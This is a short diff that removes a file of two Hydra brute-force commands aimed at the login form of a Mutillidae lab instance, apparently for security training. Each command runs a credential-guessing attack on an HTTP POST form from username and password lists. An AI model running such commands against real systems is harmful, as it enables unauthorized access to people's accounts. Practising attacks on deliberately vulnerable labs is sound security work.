@@ -1,9 +1,0 @@
-
-URL: http://mutillidae.local/index.php?page=login.php
-
-Command (mutillidae.local): hydra mutillidae.local http-form-post "/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:S=302 Found" -L usernames.txt -P passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt -V -I
-
-
-URL: http://mutillidae.localhost/index.php?page=login.php
-
-Command (mutillidae.localhost): hydra mutillidae.localhost http-form-post "/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:S=302 Found" -L usernames.txt -P passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt -V -I
